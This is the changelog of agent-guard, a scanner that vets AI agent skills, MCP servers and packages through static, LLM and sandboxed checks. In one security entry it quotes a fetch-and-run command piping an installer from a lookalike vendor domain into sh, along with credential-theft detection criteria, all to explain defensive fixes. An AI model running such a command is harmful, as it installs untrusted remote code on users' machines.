# Changelog

## 0.5.1 - 2026-10-25

### Security

- Earlier versions could report unchecked or partly checked cases as SAFE (exit 0). Upgrade recommended.

### Changed

- Exit codes: 0 SAFE, 1 BLOCK, 2 NO VERDICT. Decide by the exit code, not the
  text: exit 2 may print as `[WARN]` or `[BLOCK]`. The skill-scan exit codes
  are documented correctly now: a single HIGH or CRITICAL finding alone gives
  exit 1.
- No SAFE without a completed AI analysis (any provider; only
  `metadata.llm_available` counts): the scan ends exit 2 "static only".
  Scheduled updates (`update_skills.py`) quarantine such cases and keep the
  old version active.
- `AGENT_GUARD_STATIC_ONLY=1` now means "static checking is deliberately
  enough": it disables the AI analysis and accepts a dynamic stage skipped
  with `--no-dynamic` (exit 0 instead of 2). It does not skip that stage by
  itself.
- `--no-dynamic` gives exit 2 unless `AGENT_GUARD_STATIC_ONLY=1`
  (`scan_url.py`, `scan_mcp.py`, `scan_cli.py`).
- `audit_installed.py` without `--execute` gives exit 2 (NOT EXECUTED) for
  every listed scan (with no skill or MCP server found there is nothing to
  scan, and the exit code is 0). Unreadable configs (including an `mcpServers`
  that is not an object) and entries whose source cannot be inferred give
  exit 2.
- `audit_installed.py` reads `uvx` and `npx` entries with one option table per
  launcher. `uvx -p/--python` is a Python version, never the package; `npx
  -p/--package` is the package, and two different ones give exit 2. The option
  check now runs before the `uvx --from git+https://github.com/...` shortcut.
  An entry is not inferable (exit 2) with `--with`/`-w`, `--with-editable`,
  `--with-requirements`, an index or find-links option (`--index`,
  `--default-index`, `-i`/`--index-url`, `--extra-index-url`, `-f`), `uvx`
  constraint, override, env-file, config-file, project or directory options,
  `npx --registry`, `--userconfig`, `-c`/`--call`, workspace and prefix
  options (also in `--opt=value` form), any option the tables do not know, or
  an index or registry variable in the entry's `env` (`UV_INDEX*`,
  `UV_FIND_LINKS`, `PIP_*INDEX_URL`, `PIP_FIND_LINKS`, `npm_config_*registry*`,
  `npm_config_userconfig`). The Codex `[mcp_servers.NAME.env]` table counts too.
- `AGENT_GUARD_DNS_RESOLVERS` (comma-separated IP addresses) names resolvers
  that count as the sandbox's own resolver on port 53 even when they are
  public addresses (Linux Docker bridges copy the host's DNS servers);
  otherwise only private resolver addresses are exempt. The exemption covers
  UDP queries, whose names are still judged. TCP to port 53 of such an address
  is a finding, and the OpenSSF stage exempts private addresses only (its
  socket records carry no protocol).
- OpenSSF package-analysis results: a completed phase without `Files`, `DNS`,
  `Sockets` or `Commands` (or with one of the wrong type) gives exit 2.
- Hash-lookup results: an unseen hash, a suspicious-only file, a file skipped
  by the file limit, API errors and a missing, malformed or inconsistent
  summary give exit 2 instead of SAFE. Single-file checks in
  `scan_cli.py binary` no longer treat errors as clean.
- Directory hash lookups: an empty Cisco summary is SAFE only if agent-guard
  itself finds no checkable file. It counts the files Cisco would check
  without Cisco's path exclusions (dot directories, `__pycache__`, symlinks,
  no magic-byte library); more than Cisco looked at gives exit 2.
- GuardDog and malcontent images run with `docker run --pull=always`, so
  their rules stay current. Offline means no verdict (exit 2), never SAFE.
- `scan_url.py`: a repo with no skill and no package manifest gives exit 2
  "unsupported repo layout" (no README-only check); so do skill collections
  with non-documentation files outside the skill folders and marketplace
  candidates skipped by `--max-candidates`.
- Cooldown: a skill branch without activity entries is accepted only if the
  repository creation time proves it older than the cooldown; otherwise the
  update stops (FAILED).
- The `scan_cli.py` documentation no longer says a new or unknown binary
  passes unnoticed; it gives no verdict.
- `update_skills.py` blocks only the affected skill when an update scan
  returns `dangerous` or `unclear`, instead of automatically pausing every
  other skill from the same GitHub source; manual source pauses in
  `origins["sources"][source]["paused"]` remain supported.
- `_staging.settled_ref` follows GitHub's `Link` cursor (`after=...`) on
  `/repos/{owner}/{repo}/activity` instead of repeating page 1 with `&page=N`
  (#31).

## 0.5.0 - 2026-10-18

- **Post-release fix (#34, #33):** retain NO VERDICT update candidates and
  available scan reports for explicit manual accept/reject. Review items show
  the failure reason; repeated runs keep exit 2 without rescanning. Acceptance
  still requires a reason and an unchanged candidate hash, keeps a backup and
  records per-file approval. NO VERDICT is never automatically accepted.
- SkillSpector is pinned to a reviewed commit of NVIDIA main, `2404212`
  (package version still 2.12.0; includes #697, #704, #709, #737, #738, #779,
  #810 and the gemini ADC provider). #779 treats a command wrapper with no
  command as complete so a table cell like `| timeout |` no longer counts as a
  parser limit, and #810 keeps OpenCode's login plugins so the ChatGPT login
  works without a local workaround. The parser-span tests now use a dynamic
  `printf` substitution as their trigger. The pin moves to the release tag with
  SkillSpector 2.13.0.
- Remove the unused reviewed policy for skills CLI 1.5.26; distribution is
  pinned to 1.7.0 and keeps that version's reviewed findings.
- **New: `update_skills.py` -- scanned skill updates.** Installed skills are
  fetched by the pinned `skills` CLI in project mode into a throw-away
  directory, pinned to one commit (`owner/repo#<sha>`, recorded by the CLI as
  `ref`), compared with the installed copy and scanned only when they differ.
  Only SAFE replaces the installed version; the old one goes to `backup`. A
  BLOCK quarantines the new version with its report, pauses every skill from
  the same source and stays reported until `--accept` (with a reason),
  `--reject` or `--remove`. Accepted MEDIUM/LOW findings (rule + file) carry
  over to later versions of that skill; HIGH/CRITICAL never do. New skills use
  the same path (`--add NAME --source owner/repo`); `--import-lock` adopts the
  GitHub entries of the skills CLI's global lock. A changed project-lock format
  stops with an error instead of being guessed around.
- **LLM access paths.** SkillSpector's provider catalog now lives in
  `scripts/_providers.py` (CLI logins `claude`, `opencode`, `gemini`; API
  providers `anthropic`, `openai`, `openai_compatible`, `azure_openai`,
  `bedrock`, `gemini` through Google ADC, `nv_build`, `nv_inference`, `ollama`,
  `anthropic_proxy`) and drives profiles and the legacy environment resolution.
  Autodetection picks a key (`anthropic`, `openai`, `nv_build`) first, then a CLI
  (`claude`, `opencode`); `gemini_cli` is used only when named explicitly.
- Profiles accept an optional `settings = { VAR = "value" }` table, limited to
  the provider's non-secret settings (endpoint, region, deployment). URL
  settings must be https (plain http only for localhost, 127.0.0.1, ::1).
  Keys still come only through `key_env`.
- The verifier now runs through SkillSpector's own client with the scan's
  environment, so every enabled provider (CLI login or API key) can verify;
  `python scripts/llm_check.py` shows a `verifier` row.
- **Refused providers.** `codex_cli` (its read-only sandbox still lets
  model-driven commands read files on the machine, NVIDIA/SkillSpector#737)
  and `antigravity_cli` (prints nothing to a pipe) fail with a clear reason
  instead of running.
- **Behaviour change:** `SKILLSPECTOR_PROVIDER=gemini` now selects the Google
  Cloud ADC API provider. It used to be an alias for the Gemini CLI; use
  `gemini_cli` for that. Anyone who sets `GOOGLE_CLOUD_PROJECT` together with
  `SKILLSPECTOR_PROVIDER=gemini` now uses the Vertex/Gemini API billed per
  token instead of the Gemini CLI login.
- **Behaviour change:** an explicitly chosen provider (`SKILLSPECTOR_PROVIDER`
  or an active LLM profile) that is refused, unknown or not ready now ends in
  NO VERDICT (exit 2) instead of a static-only SAFE. For an intentional
  static-only policy set `AGENT_GUARD_STATIC_ONLY=1`.
- **Behaviour change:** with an active LLM profile, a provider setting that is
  set in the environment but not in the profile's `settings` (for example
  `AWS_REGION`, `AWS_PROFILE`, `ANTHROPIC_BASE_URL`) makes the profile not
  ready instead of being dropped silently. Move such variables into the
  profile's `settings`.
- `[distribution]` accepts the optional keys `origins`, `backup` and
  `quarantine`; without them nothing changes.
- SkillSpector now includes the upstream fix NVIDIA/SkillSpector#697: a
  command-line flag such as `--remove` in documentation is no longer read as
  an obfuscated text-removal directive, so agent-guard's own tree is fully
  inspected again.
- Calibration corpus for finding triage: `tests/corpus/manifest.toml` pins five
  public false-positive skills and five inert attack samples from
  `elliottwaves-20/agent-guard-corpus` by commit and content hash.
- **Security: `vendor-installer` no longer clears GitHub downloads.** A
  GitHub account controls its own path, so `github.com/<owner>/...` was never
  proof of an established publisher: a fake account named like the skill's
  source could ship a release asset that cleared as the vendor's installer
  (the pattern behind Island's AgentBaiting research, issue #4). The check now
  clears only the publisher's own domain over https; `purpose-mismatch-without-risk`
  and `parser-limit-span` no longer clear release, raw or archive downloads
  from a GitHub account either. Plain repository links are unaffected.
- **Security: a domain named like the source owner no longer counts as the
  publisher's.** The owner name comes from the source repository and the
  domain from whoever registers it, so a fake account `elevenlabs-tools`
  could clear `curl https://get.elevenlabs.top/install.sh | sh` as the
  vendor's installer (issue #22). Such a domain now counts only for an
  established publisher, and nothing establishes one until the publisher
  check (#14) lands. Installer lines (`vendor-installer`) and snippets or
  parser-limit passages with a link to the publisher's own website therefore
  stay open and go to the verifier; a plain link into the owner's own GitHub
  repository still clears.

## 0.4.0 - 2026-09-30

- The release self-scan passes again: the raw static scan blocks, as expected
  for a security tool, and the reviewed scan is SAFE with every accepted
  finding and its reason listed; changed source re-surfaces its findings and a
  new malicious file blocks. The README explains why a baseline from
  `skillspector baseline` misses repeated occurrences (NVIDIA/SkillSpector#630)
  and why the release self-scan runs static. The user agent of budgeted
  campaigns now reads its version from `VERSION`.

- **Fix:** `scan_mcp.py remote` failed for everyone without a Cisco AI Defense
  contract: Cisco's default analyzers include the hosted `api` analyzer, which
  aborts the scan unless `MCP_SCANNER_API_KEY` is set. Remote scans now run
  `yara,llm`, like the sandbox check.
- **Fix:** multi-stage verdicts are merged the same way everywhere. `scan_mcp.py`
  and `scan_url.py` took the numerically largest exit code, so a later
  no-verdict stage hid a BLOCK and its findings; any BLOCK now wins, and an
  unexpected exit code is no verdict, never SAFE.
- The dynamic install analysis now judges MCP stdio servers: they close stdout,
  and OpenSSF's own script then fails in the optional `execute` phase
  (`error_analysis`). What was recorded until then is judged and the verdict
  carries a `LIMIT:` line; install and import stay strict.
- A no-verdict for incomplete inspection now names every file SkillSpector did
  not fully inspect and the reason (for example `static_parse_limit`), so that
  file can be reviewed by hand.

- **Security fix (reference gate):** SkillSpector 2.12.0 split
  `reference_unresolved` into `reference_missing` (a path that matches no
  bundled file; every byte was still inspected) and `reference_unresolved` (a
  path that matches several bundled files, so it is unknown which bytes an
  instruction reaches). Since the v2.12.0 pin the wrapper still accepted
  `reference_unresolved` as a mere caveat and gave no verdict for the harmless
  missing case. Now only missing references are a caveat; an ambiguous
  reference needs a reviewed baseline, as upstream's own gate requires.
- agent-guard's own source is now fully inspectable by SkillSpector 2.12.0.
  Ten files were only partially inspected, which gives no verdict: the
  scanner reads Docker's capability flag followed by its value, and a quoted
  file-record key, as text-removal directives, and literal backticks in
  Python code or a quoted home-directory path in a shell example as runaway
  command substitutions. The same code is now spelled so every line is
  inspected (`_egress.NO_CAPABILITIES`, `\x60` / `TICK`); behaviour is
  unchanged.
- Repair SKILL.md, which was saved double-encoded with the v2.12.0 pin
  commit: agents showed a garbled skill description (each dash as three
  stray characters). A test now rejects double-encoded text in shipped files.
- Documentation: README, SKILL.md and `.env.example` now cover the personal
  config file and `llm_check.py`, `[distribution]`, the sandbox network
  capture (`--allow-host`, `--no-network`, `AGENT_GUARD_SANDBOX_ALLOW`), the
  dynamic install analysis (`--no-dynamic`, Docker, disk use, privileged
  container, `AGENT_GUARD_DYNAMIC_TIMEOUT`) and `run_all_tests.py`. SKILL.md
  tells the agent to use `--no-dynamic` and `--allow-host` only with the
  user's explicit consent. The Bedrock note no longer claims the 2.11.2
  placeholder-key step is still required.
- Add a dynamic install analysis for npm and PyPI packages
  (`scripts/_dynamic.py`), on by default in `scan_cli.py npm|pypi`,
  `scan_mcp.py pypi|npm` (Stage 1b) and the package path of `scan_url.py`.
  The package is installed and imported in OpenSSF package-analysis (gVisor
  inside a privileged Docker container, image pinned by digest) and its
  recorded behaviour is judged: reads of credential stores, writes outside
  the package areas, DNS lookups and connections beyond the registry
  (`--allow-host` adds more), network tools, and the sandbox's planted fake
  credentials showing up in a DNS name or command line. Files the package
  manager itself reads during install (calibrated on clean packages) are
  excused in that phase only. A failed or missing phase, a result for another
  package or version, a timeout or missing Docker gives no verdict;
  `--no-dynamic` skips the stage knowingly. The analysed package really
  reaches the network; the sandbox holds nothing worth stealing.
- The MCP sandbox (Stage 2) now records the target's network traffic. A
  capture container (Alpine and tcpdump pinned by digest and version) owns the
  network namespace and the target joins it. Only the PyPI and npm registries
  are allowed by default; `--allow-host HOST[:PORT]` or
  `AGENT_GUARD_SANDBOX_ALLOW` add more. Any other DNS lookup (even a failed
  one), connection, UDP datagram or ICMP packet blocks the verdict and is
  listed. A capture that does not start, drops packets or is cut short gives
  no verdict. `--no-network` runs the target with no network. uv may no
  longer download Python builds and npm skips its update check inside the
  sandbox, so neither reaches for hosts outside the list.
- The sandbox image no longer installs `cisco-ai-mcp-scanner` (unpinned and
  unused: the analyzer runs on the host) and is tagged by the hash of its
  Dockerfile, so a changed recipe always builds a fresh image.
- Add an optional local skill distribution to the user config
  (`[distribution]`, `mode = "sync"`). For machines that already run their
  own store-and-link setup, `install_skill.py skill` publishes a SAFE skill
  into the configured `inbox` and runs the configured `sync` command once,
  instead of asking for target agents; `--tools` and `--workspace` are
  refused. The sync runs without credentials, only its output lines about
  the installed skill are shown, and a sync that changes a scanned file is an
  error. A missing, failing or timed-out sync is a warning: the skill stays
  in the inbox for the next regular sync. An invalid section stops the
  installer (exit 2). Without the section nothing changes.
- Add `scripts/run_all_tests.py`: runs every test group with the interpreter
  and gates it needs (installed scanners, SkillSpector's tool Python for the
  budget contract) and fails on any skip; `--live` adds the real LLM tests.
- The live LLM tests now drive the active `skills` profile of the personal
  config (or `AGENT_GUARD_LLM_INTEGRATION_PROFILE`), read provider and model
  back from the wrapper, and fall back to `SKILLSPECTOR_*` / `claude_cli` only
  without a config.
- Add LLM profiles to the user config (`config.example.toml`). `[llm.use]`
  picks a profile per scanner -- `skills` (SkillSpector), `mcp` (Cisco
  runtime check), `campaign` (budgeted scans) -- and a profile describes only
  the connection kind: a coding-agent CLI login, any OpenAI-compatible
  endpoint, or a scanner-native provider. Switching models or providers is a
  config edit; `AGENT_GUARD_LLM[_SKILLS|_MCP|_CAMPAIGN]` switches for one run.
  An active profile replaces stale `SKILLSPECTOR_*` / `MCP_SCANNER_LLM_*`
  settings, and token limits for models SkillSpector does not know yet are
  passed as a one-model `SKILLSPECTOR_MODEL_REGISTRY`. Without a profile the
  environment-based resolution is unchanged.
- The Cisco runtime check now always receives an explicit model (it silently
  fell back to `gpt-4o`). Profiles map token cap, timeout, retries and
  temperature; `reasoning = true` applies Cisco's own reasoning request rule
  (`max_completion_tokens`, temperature 1) to models its pinned LiteLLM does
  not know yet, via `scripts/_cisco_boot.py`. Cisco analyses all tools of a
  server in parallel, so a profile's `limits.rpm` is reported, not enforced.
- Budgeted campaigns (`llm_scan.py`) take model, endpoint, key variable,
  prices, quotas and caps from the `campaign` profile instead of built-in
  Cerebras constants; the live price check runs only when the profile names a
  `pricing_url`. The policy version changed, so existing campaigns pause for
  review.
- Add `scripts/llm_check.py`: shows the effective LLM per scanner without
  network access; `--probe skills|mcp` sends exactly one request through that
  scanner's own client.
- Keep the SkillSpector pin in one place (`scripts/_pins.py`); a test keeps
  both setup scripts in sync with it.
- Pin SkillSpector v2.12.0 to commit `c7958a3268d9498644b22edb75d0f051bbc8cbfc`
  in both setup scripts. The budget adapter's patch points (chat-model
  factories, retry constants, `LLMAnalyzerBase` batch hooks) are unchanged
  upstream; its new provider retry loop is still bounded by
  `API_CONNECTION_RETRY_DELAYS_SECONDS`, which the adapter empties, so the
  Cerebras budget keeps sole control over retries. The version bump
  invalidates cached budget responses by design. Upstream adds detectors
  (SC10, TP4, AST7/AST9, AE7), so findings and verdicts can change.
- Delegate skill distribution to the pinned `skills` CLI (vercel-labs/skills 1.5.26). It writes one canonical copy to `~/.agents/skills/<name>` and links every
  agent it detects -- 80+ of them, maintained upstream -- with an NTFS junction on
  Windows and a copy fallback. Our own table only ever covered the agents we could
  inspect, and a wrong path there fails silently: the user gets an installation no
  agent loads. `--tools` now also accepts any agent name that CLI knows.
  Running a third-party CLI inside a scanner is gated: the version is pinned (a
  `skills` on PATH is ignored), the registry `shasum`/`integrity` must match, and
  GuardDog scans that exact version through our own pipeline. Its BLOCK verdict is
  accepted only when the blocking findings match
  `scripts/reviewed/skills-cli-1.5.26.json` exactly -- husky's `prepare` hook and
  three `process.env` token reads, each with a recorded reason. Both are also
  neutralised rather than argued away: the CLI runs with
  `npm_config_ignore_scripts=true` and an environment stripped of credentials.
  Findings are fingerprinted without line numbers, so a rebuild does not raise a
  false alarm. Afterwards the canonical copy is verified byte for byte against the
  scanned tree, and verified paths the CLI treats as "universal" and leaves empty
  (for example `~/.codex/skills`) are linked from it. Any failed gate falls back to
  the built-in linker; an installation never fails because of delegation.
  New: `scripts/verify_skills_cli.py` (re-verify, `--latest`, `--update <version>`),
  `AGENT_GUARD_SKILLS_CLI`, `AGENT_GUARD_SKILLS_CLI_COPY`,
  `AGENT_GUARD_SKILLS_CLI_TIMEOUT`.

- Split the installer's single "Antigravity / Gemini" target into two: `antigravity` and `gemini-cli`. Both products live under `~/.gemini/` but share no
  file. Antigravity -- the desktop App and the `agy` CLI -- reads skills from
  `~/.gemini/config/skills/` and MCP servers from `~/.gemini/config/mcp_config.json`.
  The Gemini CLI reads `~/.gemini/skills/` and `~/.gemini/settings.json`. Until now a
  Gemini CLI user silently received an installation that is never loaded. Remote MCP
  servers are written to the Gemini CLI as `httpUrl` (streamable HTTP); its `url` key
  means SSE and would select the wrong transport. Detection now also accepts an agent's
  CLI on PATH (`agy`, `gemini`), so a machine with only the CLI installed is recognised.
  `audit_installed.py` reads the Gemini CLI's servers as well.

- Terminate the whole process tree when a scan child exceeds its deadline or
  the user interrupts the run. `subprocess.run(timeout=...)` kills only the
  direct child, so an agent CLI behind an npm shim (and any container client
  it drives) kept running and kept spending the user's provider budget after
  the wrapper had already given up. All long-running scan children -- the
  SkillSpector scan, GuardDog, malcontent, the Cisco runtime scan and the
  VirusTotal helper -- now run through `_skillspector.run_bounded()`.
- Add live LLM integration tests behind `AGENT_GUARD_LLM_INTEGRATION=1`. Until
  now every LLM assertion was mocked, so a broken provider path (changed CLI
  flags, failed authentication, a provider that never answers) could not fail
  the suite. The new tests drive the configured coding-agent CLI for real and
  verify the report's own LLM call accounting.

## 0.3.1 - 2026-09-06

- Pin SkillSpector v2.11.2 to commit `69dcdfb74487d361ba4c811d088cfdea2ff3a9dc`
  in both setup scripts. Use its native workflow deadline configuration and
  remove the obsolete runtime class patch. Old scanner-version baselines
  require a fresh review; they are not migrated automatically.
- Recommend user/process environment variables for credentials and provider
  settings. Keep `.env` as an optional trusted file fallback; setup and agent
  instructions no longer require creating it.
- Fail closed on scanner errors, missing execution/LLM accounting and incomplete
  inspection. Informational GuardDog capabilities cannot hide failed rules;
  Cisco runtime scans require successfully analyzed tools.
- Keep the Cisco analyzer and its API credentials outside the untrusted MCP
  container. Clean up the per-run container even after analyzer failures.
  malcontent subprocess errors cannot be overridden by partial low-risk output.
- Make workspace selection side-effect free for installer dry runs, and
  resolve `uvx --from` to the provider package when deriving source scans.
- Stop implicitly loading configuration from working or parent directories.
  Use the trusted installation config or an explicit `AGENT_GUARD_ENV_FILE`.
  Redact installer environment values in logs, create Windows junctions
  without command-shell interpolation, and discard per-target sandbox caches.
- Use unpredictable private temporary files for JSON configuration updates
  and backups, preserving file modes. Register credential-bearing Claude Code
  entries through its user configuration instead of exposing secrets in argv.
- Remove automatic Playwright/npm provisioning during page scans. Rendered
  fetching now requires an explicitly configured, trusted installed renderer.
  Discovered remote MCP endpoints require an explicit runtime opt-in.
- Require full Git commit pins and preserve resolved PyPI/npm versions in
  installation offers. Missing PyPI releases cannot fall back to another version.
- Reject skill path traversal, indirect source entries, existing destinations
  with different content, mismatched links and escaping Git subdirectories.
  Archive containment checks use path components, including on older Python.
- Clarify the explicit trust decision when bootstrapping the scanner toolchain.
- Add explicit `scan_skill.py --baseline` support for reviewer-owned
  SkillSpector v2 JSON fingerprints. Wildcard rules, legacy fingerprints and
  mismatched scanner versions fail closed. Target-shipped baselines are never
  selected automatically. Accepted findings and reasons are printed alongside
  the verdict; the existing risk and HIGH/CRITICAL gates remain unchanged.
- Add `scan_skill.py --report` to retain JSON evidence without overwriting
  existing files. Incomplete LLM runs remain NO VERDICT even with a baseline.
- Document the self-scan review policy: SkillSpector 2.11.0 preserves static
  findings the LLM does not confirm; configuration and installer capabilities
  can therefore block agent-guard itself. A reviewed pass is distinct from a
  raw clean scan.
- Add regression coverage for baseline trust boundaries, including an opt-in
  test against the installed scanner that rejects changed source and new
  malicious content.

## 0.3.0 - 2026-09-04

Scanner upgrades plus a rework of how the wrapper drives SkillSpector's LLM
layer. Existing `.env` files keep working, except the removed legacy variables
noted below.

### SkillSpector LLM layer: CLI subscription instead of API keys

- Bump the pinned SkillSpector build from v2.1.4 to the commit behind release
  **v2.11.0**. Upstream now ships tagged releases; the pin stays on the exact
  commit so "scan = install" still applies to the scanner itself.
- `SKILLSPECTOR_PROVIDER` now accepts every upstream provider, including the
  coding-agent CLIs `claude_cli`, `codex_cli`, `gemini_cli` (the user's existing
  login, no API key) and the native `anthropic` provider. The 0.2.0 rule
  "Anthropic runs static-only" is gone — the upstream limitation it worked
  around no longer exists.
- Provider auto-detection when `SKILLSPECTOR_PROVIDER` is unset: a hosted key
  in the environment wins, then the first of `claude`, `codex`, `gemini` found
  on PATH. `.env.example` now recommends `claude_cli` as the default.
- New `AGENT_GUARD_STATIC_ONLY=1` forces static-only regardless of providers.
- The scan banner and the verdict line state which provider ran, or why the
  scan was static-only.
- A `SKILLSPECTOR_MODEL` from another vendor (e.g. a leftover `gpt-*` with
  `claude_cli`) is dropped with a note instead of failing every LLM call.
- New `scripts/_skillspector_boot.py`: SkillSpector is started inside its own
  tool environment with its aggregate scan deadline raised from the hard-coded
  60 s to `SKILLSPECTOR_MAX_WORKFLOW_SECONDS` (default: scan timeout minus
  60 s). CLI providers exhausted the upstream budget on medium-sized skills
  ("shared runtime limit reached", partial report, NO VERDICT). Upstream
  issue NVIDIA/SkillSpector#460 / PR #468 adopt the same variable; the shim is
  a no-op once the pinned build honours it natively.

### Fail-closed verdict updated to the SkillSpector 2.5–2.11 report contract

- `execution_successful: false` (top-level or in `analysis_completeness`) is a
  blocking validation failure (exit 2) and prints the `ledger_exceptions`.
- LLM completeness is judged from report metadata (`llm_requested`,
  `llm_available`, `llm_error`, `llm_calls_attempted/succeeded`) instead of
  stderr string matching. A partial LLM run is retried and, if still partial,
  blocks with NO VERDICT.
- `risk_assessment.max_issue_severity` feeds the HIGH/CRITICAL gate.
- Coverage caveats (`entirely_uninspected_files`, `partially_inspected_files`,
  `limitations`, `scope_exclusions`) are printed as `LIMIT:` lines with the
  verdict.
- Removed the wrapper-side "LLM source tree" filter that scanned a *copy* of the
  skill with binaries, archives, lockfiles and large files stripped out. It hid
  those files from the static/YARA layer too; SkillSpector's own resource bounds
  and its new hidden/nested-archive inspection now see the full tree.

### CLI-tool scans

- `scan_cli.py cargo` now runs Datadog GuardDog's `crates` scan (GuardDog 3.2.0)
  in addition to the SkillSpector static scan of the crate source; the worse
  verdict wins.

### Other

- `install_skill.py`: the default workspace probe no longer hardcodes a
  German-locale OneDrive folder; it globs `~/OneDrive/*/Github`, and
  `AGENT_GUARD_WORKSPACE` overrides the choice.
- `.env` loader strips inline `# comments` after a value.
- Cisco `cisco-ai-mcp-scanner` upgraded to 4.8.4 (dynamic tool-registration
  detection, transient-error retry).
- Docs: README, SKILL.md and `.env.example` rewritten for the provider model
  above, including why the scan uses its own isolated LLM process rather than
  the installing agent's judgment.

### Removed

- The legacy `SKILL_SCANNER_LLM_*` variables (0.1.x) are no longer read.

## 0.2.0 - 2026-06-15

- Add provider-aware `scan_skill.py` wrapper for skill scans.
- Share SkillSpector static-scan verdict logic between skill scans and MCP Stage 1.
- Require OpenAI or NVIDIA credentials for full SkillSpector LLM coverage.
- Separate Cisco runtime MCP LLM configuration via `MCP_SCANNER_LLM_*`; Cisco can use any LiteLLM-supported provider.
- Document that Anthropic under SkillSpector runs static-only in this pinned integration, while Cisco runtime provider choice is independent.
